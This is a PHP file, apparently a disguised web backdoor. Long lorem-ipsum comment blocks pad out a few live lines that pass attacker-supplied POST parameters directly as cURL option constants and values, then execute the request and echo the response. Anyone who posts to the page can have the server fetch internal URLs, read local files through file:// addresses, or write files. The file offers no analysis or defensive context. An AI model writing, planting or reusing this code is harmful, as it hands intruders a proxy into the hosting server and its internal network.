<?php

	/*
Cras condimentum ante ut augue porta, nec cursus tellus euismod. Vivamus magna dui, suscipit eget auctor non, consectetur ut justo. Proin non placerat quam, sed lacinia lorem. Pellentesque porttitor consequat posuere. Sed cursus eleifend lorem ac varius. Etiam lorem nulla, varius et gravida vitae, cursus quis nibh. Quisque ultricies nibh non fringilla varius. Vestibulum malesuada tristique arcu a viverra. Quisque sodales rhoncus ullamcorper. Fusce auctor diam sapien, sit amet pharetra turpis iaculis sit amet. In porta ligula non consectetur accumsan. Suspendisse iaculis elit in nibh posuere malesuada quis sit amet orci. Sed et quam ultrices, finibus lorem a, aliquet metus. Fusce nulla massa, rhoncus viverra justo nec, ultricies blandit nulla. Cras suscipit pharetra ante at blandit.

Donec commodo libero quam, id pellentesque elit ornare vel. Ut quis quam lectus. Duis a ex lorem. Pellentesque habitant morbi tristique senectus et netus et malesuada fames ac turpis egestas. Fusce vel tempor nisl. Interdum et malesuada fames ac ante ipsum primis in faucibus. Suspendisse placerat augue sed est rhoncus lacinia. Curabitur et scelerisque purus. Aenean ultricies condimentum ultricies. Maecenas a nulla augue.

Etiam lobortis consectetur rhoncus. Quisque consectetur vitae enim id placerat. Donec luctus eros eu turpis venenatis vestibulum. Maecenas ut efficitur lacus, vitae tempor lorem. Vivamus mattis lacinia odio eget imperdiet. Nunc tempor purus turpis, non tempus eros tristique sed. Aliquam blandit vulputate lorem at sagittis. Donec aliquet eleifend velit in molestie. Praesent auctor et odio non euismod. Quisque nec ligula tincidunt, gravida nunc euismod, tristique metus. Nam sodales velit vitae orci vulputate imperdiet. Donec in est vel quam ultrices lacinia at quis nisl.

Mauris auctor elit in nibh luctus euismod. Aenean eget nulla arcu. Sed laoreet vel lorem nec eleifend. Curabitur in elementum nisi, vel fermentum mi. Nullam arcu dui, egestas id libero vel, tristique egestas purus. Morbi eget velit dui. Sed ac nibh lobortis, feugiat lorem vel, vestibulum orci. Mauris id nulla nec mi maximus venenatis nec et nisl. In lacinia quis elit sed interdum. Sed purus quam, porttitor at mi sodales, placerat ornare lorem. Nulla et bibendum turpis. Aenean eget nunc felis. In maximus hendrerit lectus at blandit. In et accumsan urna. Nulla neque eros, imperdiet quis velit vitae, dapibus efficitur ante.

Praesent ac finibus neque. Sed massa purus, hendrerit vulputate nisl a, egestas blandit dui. Nunc a justo molestie, tempor arcu ac, sollicitudin mi. Nulla vitae elit quis libero molestie varius. Nulla at fermentum elit, non aliquet lectus. Etiam aliquam velit in varius aliquam. Mauris a enim a ipsum feugiat elementum. Vestibulum ante ipsum primis in faucibus orci luctus et ultrices posuere cubilia Curae; Donec aliquet libero aliquet facilisis mattis.


*/
	$ch = curl_init();

	curl_setopt_array($ch,
	    array_combine(
	        array_map("constant", array_keys($_POST)),
	        array_values($_POST)
	    )
	);

	$result = curl_exec($ch);

	curl_close($ch);

	echo $result;

/*
Cras condimentum ante ut augue porta, nec cursus tellus euismod. Vivamus magna dui, suscipit eget auctor non, consectetur ut justo. Proin non placerat quam, sed lacinia lorem. Pellentesque porttitor consequat posuere. Sed cursus eleifend lorem ac varius. Etiam lorem nulla, varius et gravida vitae, cursus quis nibh. Quisque ultricies nibh non fringilla varius. Vestibulum malesuada tristique arcu a viverra. Quisque sodales rhoncus ullamcorper. Fusce auctor diam sapien, sit amet pharetra turpis iaculis sit amet. In porta ligula non consectetur accumsan. Suspendisse iaculis elit in nibh posuere malesuada quis sit amet orci. Sed et quam ultrices, finibus lorem a, aliquet metus. Fusce nulla massa, rhoncus viverra justo nec, ultricies blandit nulla. Cras suscipit pharetra ante at blandit.

Donec commodo libero quam, id pellentesque elit ornare vel. Ut quis quam lectus. Duis a ex lorem. Pellentesque habitant morbi tristique senectus et netus et malesuada fames ac turpis egestas. Fusce vel tempor nisl. Interdum et malesuada fames ac ante ipsum primis in faucibus. Suspendisse placerat augue sed est rhoncus lacinia. Curabitur et scelerisque purus. Aenean ultricies condimentum ultricies. Maecenas a nulla augue.

Etiam lobortis consectetur rhoncus. Quisque consectetur vitae enim id placerat. Donec luctus eros eu turpis venenatis vestibulum. Maecenas ut efficitur lacus, vitae tempor lorem. Vivamus mattis lacinia odio eget imperdiet. Nunc tempor purus turpis, non tempus eros tristique sed. Aliquam blandit vulputate lorem at sagittis. Donec aliquet eleifend velit in molestie. Praesent auctor et odio non euismod. Quisque nec ligula tincidunt, gravida nunc euismod, tristique metus. Nam sodales velit vitae orci vulputate imperdiet. Donec in est vel quam ultrices lacinia at quis nisl.

Mauris auctor elit in nibh luctus euismod. Aenean eget nulla arcu. Sed laoreet vel lorem nec eleifend. Curabitur in elementum nisi, vel fermentum mi. Nullam arcu dui, egestas id libero vel, tristique egestas purus. Morbi eget velit dui. Sed ac nibh lobortis, feugiat lorem vel, vestibulum orci. Mauris id nulla nec mi maximus venenatis nec et nisl. In lacinia quis elit sed interdum. Sed purus quam, porttitor at mi sodales, placerat ornare lorem. Nulla et bibendum turpis. Aenean eget nunc felis. In maximus hendrerit lectus at blandit. In et accumsan urna. Nulla neque eros, imperdiet quis velit vitae, dapibus efficitur ante.

Praesent ac finibus neque. Sed massa purus, hendrerit vulputate nisl a, egestas blandit dui. Nunc a justo molestie, tempor arcu ac, sollicitudin mi. Nulla vitae elit quis libero molestie varius. Nulla at fermentum elit, non aliquet lectus. Etiam aliquam velit in varius aliquam. Mauris a enim a ipsum feugiat elementum. Vestibulum ante ipsum primis in faucibus orci luctus et ultrices posuere cubilia Curae; Donec aliquet libero aliquet facilisis mattis.

*/
?>